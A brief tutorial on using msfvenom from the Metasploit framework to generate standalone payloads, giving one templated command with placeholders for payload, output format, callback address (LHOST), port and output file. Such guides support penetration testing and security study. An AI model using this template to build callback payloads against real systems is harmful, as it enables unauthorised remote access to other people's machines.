# Msfvenom Practical Guide

## Generating Standalone Payloads and Listeners

Msvenom is a powerful tool in the Metasploit framework used for payload generation. It allows you to create payloads for various platforms.

### Basic Payload Generation

To generate a basic payload for a specific platform, use the following command:

```bash
msfvenom -p [payload] -f [format] LHOST=[your_IP] LPORT=[port] -o [output_filename]
```
Replace [payload] with the desired payload.
Specify the format with -f (e.g., exe, apk, etc.).
Set your IP with LHOST and the desired port with LPORT.
Save the output with -o [output_filename].
